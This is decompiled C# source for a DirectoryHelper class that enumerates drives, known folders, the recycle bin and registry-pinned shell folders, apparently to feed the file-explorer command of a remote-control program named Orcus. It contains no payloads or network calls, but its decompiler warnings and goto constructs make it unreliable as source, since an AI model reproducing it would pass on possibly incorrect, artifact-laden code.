using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;
using Orcus.Native;
using Orcus.Shared.Commands.FileExplorer;
using Orcus.Utilities;
using ShellDll;

namespace Orcus.Commands.FileExplorer;

public class DirectoryHelper
{
	public static List<PackedDirectoryEntry> GetNamespaceDirectories()
	{
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00da: Expected O, but got Unknown
		if (CoreHelper.RunningOnXP)
		{
			return new List<PackedDirectoryEntry>();
		}
		Dictionary<PackedDirectoryEntry, int> dictionary = new Dictionary<PackedDirectoryEntry, int>();
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Classes\\CLSID");
			if (registryKey != null)
			{
				string[] subKeyNames = registryKey.GetSubKeyNames();
				foreach (string name in subKeyNames)
				{
					using RegistryKey registryKey2 = registryKey.OpenSubKey(name);
					if ((int?)registryKey2?.GetValue("System.IsPinnedToNameSpaceTree", 0) != 1)
					{
						continue;
					}
					using RegistryKey registryKey3 = registryKey2.OpenSubKey("Instance\\InitPropertyBag");
					object obj;
					if (registryKey3 == null)
					{
						obj = null;
					}
					else
					{
						obj = registryKey3.GetValue("TargetFolderPath", null);
						if (obj != null)
						{
							goto IL_00c1;
						}
					}
					obj = registryKey3?.GetValue("TargetKnownFolder");
					goto IL_00c1;
					IL_00c1:
					string text = (string)obj;
					if (text == null)
					{
						continue;
					}
					DirectoryInfoEx val = new DirectoryInfoEx(text);
					PackedDirectoryEntry directoryEntry;
					try
					{
						directoryEntry = GetDirectoryEntry(val, null);
					}
					finally
					{
						((IDisposable)val)?.Dispose();
					}
					if (directoryEntry != null)
					{
						string text2 = (string)registryKey2.GetValue("");
						if (!string.IsNullOrEmpty(text2))
						{
							((DirectoryEntry)directoryEntry).set_Label(text2);
						}
						dictionary.Add(directoryEntry, ((int?)registryKey2.GetValue("SortOrderIndex", null)) ?? 2147483646);
					}
				}
			}
		}
		catch (Exception)
		{
		}
		dictionary.Add(GetDirectoryEntry(DirectoryInfoEx.RecycleBinDirectory, null), -1);
		return (from x in dictionary
			orderby x.Value
			select x.Key).ToList();
	}

	public static List<IFileExplorerEntry> GetComputerDirectoryEntries()
	{
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		if (CoreHelper.RunningOnXP)
		{
			return (from x in DriveInfo.GetDrives()
				select GetDirectoryEntry(new DirectoryInfoEx(x.RootDirectory.FullName), null)).Cast<IFileExplorerEntry>().ToList();
		}
		List<IFileExplorerEntry> directoryEntries = GetDirectoryEntries(DirectoryInfoEx.MyComputerDirectory);
		if (!CoreHelper.RunningOnWin8OrGreater)
		{
			bool flag = false;
			try
			{
				DirectoryInfoEx val = new DirectoryInfoEx((KnownFolderIds)36);
				directoryEntries.InsertRange(0, (from x in val.GetDirectories()
					select GetDirectoryEntry(x, null)).Cast<IFileExplorerEntry>());
				flag = true;
			}
			catch (Exception)
			{
			}
			if (!flag)
			{
				PackedDirectoryEntry val2 = ExceptionUtilities.EatExceptions(() => GetDirectoryEntry(new DirectoryInfoEx(Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)), null));
				if (val2 != null)
				{
					directoryEntries.Insert(0, (IFileExplorerEntry)(object)val2);
				}
				PackedDirectoryEntry val3 = ExceptionUtilities.EatExceptions(() => GetDirectoryEntry(new DirectoryInfoEx(Environment.GetFolderPath(Environment.SpecialFolder.Personal)), null));
				if (val3 != null)
				{
					directoryEntries.Insert(0, (IFileExplorerEntry)(object)val3);
				}
				PackedDirectoryEntry val4 = ExceptionUtilities.EatExceptions(() => GetDirectoryEntry(new DirectoryInfoEx(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures)), null));
				if (val4 != null)
				{
					directoryEntries.Insert(0, (IFileExplorerEntry)(object)val4);
				}
			}
		}
		return directoryEntries;
	}

	public static PackedDirectoryEntry GetDirectoryEntry(DirectoryInfoEx directory, string parentFolder)
	{
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Invalid comparison between Unknown and I4
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0092: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Expected O, but got Unknown
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_0107: Expected O, but got Unknown
		if (!((FileSystemInfo)(object)directory).Exists)
		{
			try
			{
				Guid guid = new Guid(((FileSystemInfoEx)directory).get_FullName());
				directory = new DirectoryInfoEx(KnownFolder.FromKnownFolderId(guid));
				if (!((FileSystemInfo)(object)directory).Exists)
				{
					return null;
				}
			}
			catch (Exception)
			{
				return null;
			}
		}
		PackedDirectoryEntry val2;
		if ((int)directory.get_DirectoryType() == 2)
		{
			DriveInfo driveInfo = DriveInfo.GetDrives().FirstOrDefault((DriveInfo x) => x.RootDirectory.FullName == ((FileSystemInfoEx)directory).get_FullName());
			if (driveInfo != null)
			{
				if (!driveInfo.IsReady)
				{
					DriveDirectoryEntry val = new DriveDirectoryEntry();
					val.set_TotalSize(0L);
					val.set_UsedSpace(0L);
					val.set_DriveType((DriveDirectoryType)(byte)driveInfo.DriveType);
					val2 = (PackedDirectoryEntry)val;
				}
				else
				{
					DriveDirectoryEntry val3 = new DriveDirectoryEntry();
					val3.set_TotalSize(driveInfo.TotalSize);
					val3.set_UsedSpace(driveInfo.TotalSize - driveInfo.TotalFreeSpace);
					val3.set_DriveType((DriveDirectoryType)(byte)driveInfo.DriveType);
					val2 = (PackedDirectoryEntry)val3;
				}
			}
			else
			{
				val2 = new PackedDirectoryEntry();
			}
		}
		else
		{
			val2 = new PackedDirectoryEntry();
		}
		((DirectoryEntry)val2).set_Name(((FileSystemInfo)(object)directory).Name);
		((DirectoryEntry)val2).set_HasSubFolder(directory.get_HasSubFolder());
		((DirectoryEntry)val2).set_CreationTime(((FileSystemInfoEx)directory).get_CreationTimeUtc());
		((DirectoryEntry)val2).set_LastAccess(((FileSystemInfoEx)directory).get_LastAccessTimeUtc());
		SetFolderLabelResource(directory, val2);
		val2.set_IconId(GetFolderIcon(directory));
		if ((parentFolder == null && ((FileSystemInfoEx)directory).get_FullName() != ((FileSystemInfo)(object)directory).Name) || parentFolder != ExceptionUtilities.EatExceptions(() => ((FileSystemInfoEx)directory).get_FullName()))
		{
			((DirectoryEntry)val2).set_Path(((FileSystemInfoEx)directory).get_FullName());
		}
		return val2;
	}

	public static List<IFileExplorerEntry> GetDirectoryEntries(string path)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		DirectoryInfoEx val = new DirectoryInfoEx(path);
		try
		{
			return GetDirectoryEntries(val);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public static List<IFileExplorerEntry> GetDirectoryEntries(DirectoryInfoEx directory)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_011d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Expected O, but got Unknown
		List<IFileExplorerEntry> list = new List<IFileExplorerEntry>();
		if (CoreHelper.RunningOnXP && ExceptionUtilities.EatExceptions((Func<bool?>)(() => Directory.Exists(((FileSystemInfoEx)directory).get_FullName()))) == true)
		{
			FileSystemInfo[] fileSystemInfos = new DirectoryInfo(((FileSystemInfoEx)directory).get_FullName()).GetFileSystemInfos();
			foreach (FileSystemInfo fileSystemInfo in fileSystemInfos)
			{
				if (fileSystemInfo is DirectoryInfo)
				{
					list.Add((IFileExplorerEntry)(object)GetDirectoryEntry(new DirectoryInfoEx(fileSystemInfo.FullName), ((FileSystemInfoEx)directory).get_FullName()));
				}
				else
				{
					list.Add((IFileExplorerEntry)(object)GetFileEntry(new FileInfoEx(fileSystemInfo.FullName), ((FileSystemInfoEx)directory).get_FullName()));
				}
			}
			return list;
		}
		foreach (FileSystemInfoEx item in directory.EnumerateFileSystemInfos("*", SearchOption.TopDirectoryOnly))
		{
			FileSystemInfoEx val = item;
			try
			{
				if (item.get_IsFolder())
				{
					list.Add((IFileExplorerEntry)(object)GetDirectoryEntry((DirectoryInfoEx)item, ((FileSystemInfoEx)directory).get_FullName()));
				}
				else
				{
					list.Add((IFileExplorerEntry)(object)GetFileEntry((FileInfoEx)item, ((FileSystemInfoEx)directory).get_FullName()));
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		return list;
	}

	public static List<PackedDirectoryEntry> GetDirectoriesFast(string path)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		List<PackedDirectoryEntry> list = new List<PackedDirectoryEntry>();
		DirectoryInfo[] directories = new DirectoryInfo(path).GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			PackedDirectoryEntry val = new PackedDirectoryEntry();
			((DirectoryEntry)val).set_CreationTime(directoryInfo.CreationTimeUtc);
			((DirectoryEntry)val).set_Name(directoryInfo.Name);
			((DirectoryEntry)val).set_LastAccess(directoryInfo.LastAccessTimeUtc);
			((DirectoryEntry)val).set_HasSubFolder(directoryInfo.GetDirectories().Length != 0);
			list.Add(val);
		}
		return list;
	}

	public static List<PackedDirectoryEntry> GetDirectories(DirectoryInfoEx directory)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		List<PackedDirectoryEntry> list = new List<PackedDirectoryEntry>();
		if (CoreHelper.RunningOnXP)
		{
			DirectoryInfo[] directories = new DirectoryInfo(((FileSystemInfoEx)directory).get_FullName()).GetDirectories();
			foreach (DirectoryInfo directoryInfo in directories)
			{
				list.Add(GetDirectoryEntry(new DirectoryInfoEx(directoryInfo.FullName), ((FileSystemInfoEx)directory).get_FullName()));
			}
			return list;
		}
		foreach (DirectoryInfoEx item in directory.EnumerateDirectories("*", SearchOption.TopDirectoryOnly))
		{
			list.Add(GetDirectoryEntry(item, ((FileSystemInfoEx)directory).get_FullName()));
		}
		return list;
	}

	private static FileEntry GetFileEntry(FileInfoEx fileInfo, string parentFolder)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		//IL_006e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Invalid comparison between Unknown and I4
		FileEntry val = new FileEntry();
		val.set_Name(((FileSystemInfo)(object)fileInfo).Name);
		val.set_Size(fileInfo.get_Length());
		val.set_CreationTime(((FileSystemInfoEx)fileInfo).get_CreationTimeUtc());
		val.set_LastAccess(((FileSystemInfoEx)fileInfo).get_LastAccessTimeUtc());
		FileEntry val2 = val;
		if (fileInfo.get_DirectoryName() != parentFolder)
		{
			val2.set_Path(((FileSystemInfoEx)fileInfo).get_FullName());
		}
		if (CoreHelper.RunningOnXP)
		{
			return val2;
		}
		DirectoryInfoEx parent = ((FileSystemInfoEx)fileInfo).get_Parent();
		if (parent != null && (int?)parent.get_KnownFolderId() == 75)
		{
			val2.set_Path(((FileSystemInfoEx)fileInfo).get_FullName());
			val2.set_Name(((FileSystemInfoEx)fileInfo).get_Label());
		}
		return val2;
	}

	private static void SetFolderLabelResource(DirectoryInfoEx directory, PackedDirectoryEntry directoryEntry)
	{
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		if (CoreHelper.RunningOnXP)
		{
			return;
		}
		if (((FileSystemInfo)(object)directory).Name != ((FileSystemInfoEx)directory).get_Label())
		{
			((DirectoryEntry)directoryEntry).set_Label(((FileSystemInfoEx)directory).get_Label());
		}
		try
		{
			KnownFolder knownFolderType = directory.get_KnownFolderType();
			if (!string.IsNullOrEmpty((knownFolderType != null) ? knownFolderType.get_Definition().LocalizedName : null))
			{
				string[] array = directory.get_KnownFolderType().get_Definition().LocalizedName.TrimStart(new char[1] { '@' }).Split(new char[1] { ',' });
				if (array.Length == 2 && int.TryParse(array[1], out var result))
				{
					directoryEntry.set_LabelPath(array[0]);
					directoryEntry.set_LabelId(result);
					return;
				}
			}
		}
		catch (Exception)
		{
		}
		StringBuilder stringBuilder = new StringBuilder(500);
		uint cch = (uint)stringBuilder.Capacity;
		if (NativeMethods.SHGetLocalizedName(((FileSystemInfoEx)directory).get_FullName(), stringBuilder, ref cch, out var pidsRes) == IntPtr.Zero)
		{
			directoryEntry.set_LabelPath(stringBuilder.ToString());
			directoryEntry.set_LabelId(pidsRes);
		}
	}

	private static int GetFolderIcon(DirectoryInfoEx directory)
	{
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ef: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f3: Invalid comparison between Unknown and I4
		//IL_00f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Invalid comparison between Unknown and I4
		//IL_00fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ff: Invalid comparison between Unknown and I4
		switch (((FileSystemInfo)(object)directory).Name.ToLower())
		{
		default:
		{
			try
			{
				KnownFolder knownFolderType = directory.get_KnownFolderType();
				string text = ((knownFolderType != null) ? knownFolderType.get_Definition().Icon : null);
				if (!string.IsNullOrEmpty(text))
				{
					string[] array = text.Trim(new char[1] { '"' }).Split(new char[1] { ',' });
					if (array.Length == 2 && array[0].EndsWith("imageres.dll", StringComparison.OrdinalIgnoreCase) && int.TryParse(array[1], out var result))
					{
						return result;
					}
				}
			}
			catch (Exception)
			{
			}
			try
			{
				KnownFolder knownFolderType2 = directory.get_KnownFolderType();
				KnownFolderIds? val = ((knownFolderType2 != null) ? knownFolderType2.get_KnownFolderId() : null);
				if (val.HasValue)
				{
					KnownFolderIds valueOrDefault = val.GetValueOrDefault();
					if ((int)valueOrDefault == 15)
					{
						return -109;
					}
					if ((int)valueOrDefault == 44)
					{
						return -1013;
					}
					if ((int)valueOrDefault == 75)
					{
						return -54;
					}
				}
			}
			catch (Exception)
			{
			}
			SHFILEINFO psfi = default(SHFILEINFO);
			NativeMethods.SHGetFileInfo(((FileSystemInfoEx)directory).get_FullName(), 0u, ref psfi, (uint)Marshal.SizeOf((object)psfi), (SHGFI)4096);
			if (!psfi.szDisplayName.EndsWith("imageres.dll", StringComparison.OrdinalIgnoreCase))
			{
				return 0;
			}
			return psfi.iIcon;
		}
		case "pictures.library-ms":
			return -113;
		case "documents.library-ms":
			return -112;
		case "videos.library-ms":
			return -189;
		case "music.library-ms":
			return -108;
		}
	}
}
